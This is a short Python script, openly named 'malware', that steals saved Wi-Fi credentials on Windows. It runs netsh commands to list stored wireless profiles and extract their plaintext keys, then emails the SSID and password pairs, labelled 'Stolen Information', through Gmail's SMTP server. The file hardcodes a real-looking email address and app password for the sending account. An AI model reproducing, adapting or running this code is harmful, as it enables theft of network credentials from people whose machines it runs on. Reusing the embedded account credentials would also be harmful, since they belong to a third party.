import smtplib
import re
import subprocess
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
class malware:
	def __init__(self,user,passw):
		print("Programe has started!")
		self.userName = user
		self.passWord = passw
	def excute_command(self):
		command = "netsh wlan show profile"
		output = subprocess.run(command,shell=True,capture_output=True,text=True)
		return output.stdout
	def extract_infor(self,L):
		network_name = []
		for x in L:
			x = x[2:]
			network_name.append(x)
		return network_name
	def get_SSID_Password(self,L):
		pattern = re.compile(r"\s+Key Content\s+:\s.{8,50}")
		l = []
		for x in L:
			try:
				result = subprocess.run("Netsh wlan show profile "+"\"{}\"".format(x)+" key=clear",shell=True,text=True,capture_output=True)
				result = pattern.findall(result.stdout)
				if len(result) !=0:
					l.append({"SSID: ":x.strip(),"PASSWORD: ":result[-1].strip()})		
				else:
					l.append({"SSID: ":x.strip(),"PASSWORD: ":"NONE"})
			except Exception as e:
				print(e)
		return l
	def send_mail(self,message):
		msg = MIMEMultipart()
		msg["From"] = self.userName
		msg["To"] = self.userName
		msg["subject"] = "Stolen Information"
		msg.attach(MIMEText(str(message),"plain"))
		try: 
			server = smtplib.SMTP("smtp.gmail.com",587) #port 587 for tls
			server.starttls()
			server.login(self.userName,self.passWord)
			server.sendmail(self.userName,self.userName,msg.as_string())
			print("Send mail successful.")
			server.quit()
		except Exception as e:
			print("Error during executing code {}".format(e))
	def run(self):
		message = self.excute_command()
		network_name_list = re.findall(r":\s.{0,100}",message)
		del network_name_list[0]
		L = self.get_SSID_Password(self.extract_infor(network_name_list))
		self.send_mail(L)
		sys.exit("Programming is run completely")
mal = malware("manhcuongnguyen373@gmail.com","vxsvzmfwisksssks")
mal.run()

"""
run command
get network infor
get SSID + PASSWORD
send mail
"""